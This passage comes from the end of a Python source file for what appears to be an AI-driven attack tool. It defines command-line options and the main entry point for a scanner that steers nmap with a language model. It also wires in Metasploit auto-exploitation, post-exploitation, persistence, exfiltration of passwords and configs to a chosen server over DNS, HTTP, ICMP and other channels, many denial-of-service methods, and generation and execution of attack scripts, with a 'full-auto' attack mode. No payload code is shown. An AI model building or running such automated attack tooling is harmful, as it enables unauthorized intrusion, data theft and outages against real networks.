    parser.add_argument('--services', action='store_true', help='Enable detailed service detection')
    parser.add_argument('--version', action='store_true', help='Enable version detection')
    parser.add_argument('--os', action='store_true', help='Enable OS detection')
    parser.add_argument('--vuln', action='store_true', help='Enable vulnerability scanning')
    parser.add_argument('--timeout', type=int, default=30, help='Timeout for model responses (default: 30)')
    parser.add_argument('--max-threads', type=int, default=4, help='Limit concurrent scan operations (default: 4)')
    parser.add_argument('--memory-limit', help='Set memory limit for operations')
    parser.add_argument('--show-live-ai', action='store_true', help='Show live AI responses during generation')
    
    # Metasploit options
    parser.add_argument('--msf', action='store_true', help='Enable Metasploit integration')
    parser.add_argument('--exploit', action='store_true', help='Automatically attempt exploitation')
    parser.add_argument('--workspace', default='adaptive_scan', help='Metasploit workspace (default: adaptive_scan)')
    parser.add_argument('--auto-script', action='store_true', help='Auto-generate Metasploit resource scripts')
    parser.add_argument('--options', help='Custom Metasploit options (format: OPT1=val1 OPT2=val2)')
    parser.add_argument('--payload', help='Specify Metasploit payload')
    parser.add_argument('--module', help='Specify Metasploit module')
    parser.add_argument('--post', action='store_true', help='Enable post-exploitation')
    
    # Red team arguments
    parser.add_argument('--red-team', action='store_true', help='Enable full red team mode')
    parser.add_argument('--persistence', action='store_true', help='Attempt to establish persistent access')
    parser.add_argument('--exfil', action='store_true', help='Enable data exfiltration')
    parser.add_argument('--exfil-method', choices=['dns', 'http', 'icmp', 'smb', 'ftp'], help='Data exfiltration method')
    parser.add_argument('--exfil-data', choices=['passwords', 'configs', 'all'], help='Data to exfiltrate')
    parser.add_argument('--exfil-server', help='Server to exfiltrate data to')
    parser.add_argument('--full-auto', action='store_true', help='Enable full automated scanning and attack mode')
    
    # DoS arguments
    parser.add_argument('--dos', action='store_true', help='Enable DoS attack mode')
    parser.add_argument('--dos-method', choices=[
        'udp', 'icmp', 'slowloris', 'syn', 'http',
        'cpu', 'memory', 'disk',
        'http2', 'dns', 'slowpost', 'tcp',
        'dbpool', 'cache',
        'bgp', 'arp', 'vlan'
    ], help='DoS attack method')
    parser.add_argument('--dos-threads', type=int, default=10, help='Number of attack threads')
    parser.add_argument('--dos-duration', type=int, default=60, help='Attack duration in seconds')
    parser.add_argument('--dos-payload', help='Custom payload for DoS attack')
    
    # Script generation
    parser.add_argument('--generate-script', action='store_true', help='Generate attack script')
    parser.add_argument('--script-type', choices=['python', 'bash', 'powershell', 'ruby'], help='Script type to generate')
    parser.add_argument('--script-name', help='Name for the generated script')
    parser.add_argument('--script-generation-type', choices=['attack', 'recon', 'dos', 'exploit'], 
                        default='attack', help='Type of script to generate')
    parser.add_argument('--execute-scripts', action='store_true', help='Execute generated scripts')
    parser.add_argument('--custom-scripts', action='store_true', help='Enable custom script generation')
    
    # General options
    parser.add_argument('--custom-vuln-file', help='Custom vulnerability definitions file')
    parser.add_argument('--log-file', help='Log file to write output')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
    parser.add_argument('--debug', action='store_true', help='Enable debug logging')
    parser.add_argument('--output', help='Output file for scan results')
    parser.add_argument('--format', choices=['text', 'xml', 'json'], default='text', help='Output format')
    
    # Create a scanner with the parsed arguments
    args = parser.parse_args()
    
    # Configure full-auto mode if requested
    if args.full_auto:
        args.auto_discover = True
        args.scan_all = True
        args.services = True
        args.version = True
        args.os = True
        args.vuln = True
        
    # Create scanner instance
    scanner = AdaptiveNmapScanner(
        target=args.target,
        auto_discover=args.auto_discover,
        interface=args.interface,
        scan_all=args.scan_all,
        network=args.network,
        host_timeout=args.host_timeout,
        model=args.model,
        iterations=args.iterations,
        continuous=args.continuous,
        delay=args.delay,
        stealth=args.stealth,
        ports=args.ports,
        services=args.services,
        version_detection=args.version,
        os_detection=args.os,
        vulnerability_scan=args.vuln,
        model_timeout=args.timeout,
        max_threads=args.max_threads,
        memory_limit=args.memory_limit,
        show_live_ai=args.show_live_ai,
        msf_integration=args.msf,
        msf_options={
            'enabled': args.msf,
            'exploit': args.exploit,
            'workspace': args.workspace,
            'auto_script': args.auto_script,
            'options': args.options
        } if args.msf else None,
        msf_payload=args.payload,
        msf_module=args.module,
        post_exploitation=args.post,
        red_team=args.red_team,
        persistence=args.persistence,
        exfil=args.exfil,
        exfil_method=args.exfil_method,
        exfil_data=args.exfil_data,
        exfil_server=args.exfil_server,
        dos_attack=args.dos,
        dos_method=args.dos_method,
        dos_threads=args.dos_threads,
        dos_duration=args.dos_duration,
        dos_payload=args.dos_payload,
        generate_script=args.generate_script,
        script_type=args.script_type,
        script_generation_type=args.script_generation_type,
        generate_script_name=args.script_name,
        execute_scripts=args.execute_scripts,
        custom_scripts=args.custom_scripts,
        custom_vuln_file=args.custom_vuln_file,
        log_file=args.log_file,
        verbose=args.verbose,
        quiet=args.quiet,
        debug=args.debug,
        output_file=args.output,
        output_format=args.format
    )
    
    return scanner

def main():
    """Main entry point."""
    try:
        # Parse arguments and get scanner
        scanner = parse_arguments()
        
        # Configure logging
        if scanner.log_file:
            # Set up file logging
            file_handler = logging.FileHandler(scanner.log_file)
            file_handler.setLevel(logging.DEBUG if scanner.debug else logging.INFO)
            file_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
            logging.getLogger().addHandler(file_handler)
            logging.info(f"Logging to file: {scanner.log_file}")
                
        # Set verbosity level based on debug/verbose flags
        if scanner.debug:
            logging.getLogger().setLevel(logging.DEBUG)
        elif scanner.verbose:
            logging.getLogger().setLevel(logging.INFO)
        elif scanner.quiet:
            logging.getLogger().setLevel(logging.WARNING)
        
        # Run the scanner
        scanner.run()
    except KeyboardInterrupt:
        logging.info("Operation canceled by user")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Error in main execution: {e}")
        if logging.getLogger().level == logging.DEBUG:
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main() 